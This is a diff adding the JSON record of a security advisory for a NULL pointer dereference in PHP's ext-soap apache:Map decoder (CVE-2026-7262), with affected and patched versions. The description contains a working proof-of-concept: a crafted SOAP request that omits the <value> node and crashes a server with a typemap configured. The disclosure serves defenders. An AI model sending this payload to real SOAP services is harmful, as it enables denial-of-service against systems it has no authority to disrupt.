@@ -1,0 +1,72 @@
+{
+  "global": null,
+  "id": "GHSA-hmxp-6pc4-f3vv",
+  "repo": {
+    "cve_id": "CVE-2026-7262",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 6.3,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [],
+    "description": "`to_zval_map()` in `ext/soap/php_encoding.c` decodes `apache:Map` nodes. The `<key>` branch correctly guards against missing keys, but the `<value>` branch rechecks `xmlKey` instead of `xmlValue`:\r\n\r\nhttps://github.com/php/php-src/blob/0d9ff00394d9447992bb66ccb1cef3edf70576bd/ext/soap/php_encoding.c#L2780-L2788\r\n\r\nIn addition, `master_to_zval_int()` accesses `data->properties` without a `NULL` check, where `data` corresponds to the missing `<value>` node. This branch is reachable when `SOAP_GLOBAL(typemap)` is set, i.e. when the SOAP server has a typemap configured. By embedding an `apache:Map` node with a missing `<value>` node into the request, the process will segfault with a `NULL` pointer dereference violation. Under the described circumstances, DoS becomes trivial with the following example:\r\n\r\n```php\r\n$request = <<<XML\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<soap:Envelope\r\n    xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n    xmlns:apache=\"http://xml.apache.org/xml-soap\">\r\n  <soap:Body>\r\n    <test>\r\n      <map xsi:type=\"apache:Map\">\r\n        <item><key>foo</key></item>\r\n      </map>\r\n    </test>\r\n  </soap:Body>\r\n</soap:Envelope>\r\nXML;\r\n\r\n$server = new SoapServer(null, [\r\n    'uri' => 'urn:test',\r\n    'typemap' => [['type_name' => 'anything']],\r\n]);\r\n$server->addFunction('test');\r\nfunction test($m) {}\r\n$server->handle($request);\r\n```",
+    "ghsa_id": "GHSA-hmxp-6pc4-f3vv",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-hmxp-6pc4-f3vv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-hmxp-6pc4-f3vv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-7262"
+      }
+    ],
+    "published_at": "2026-05-07T12:57:55Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "NULL pointer dereference in SOAP apache:Map decoder with missing <value>",
+    "updated_at": "2026-05-07T12:57:55Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.2.31",
+        "vulnerable_version_range": "< 8.2.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.3.31",
+        "vulnerable_version_range": "< 8.3.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.4.21",
+        "vulnerable_version_range": "< 8.4.21"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.5.6",
+        "vulnerable_version_range": "< 8.5.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
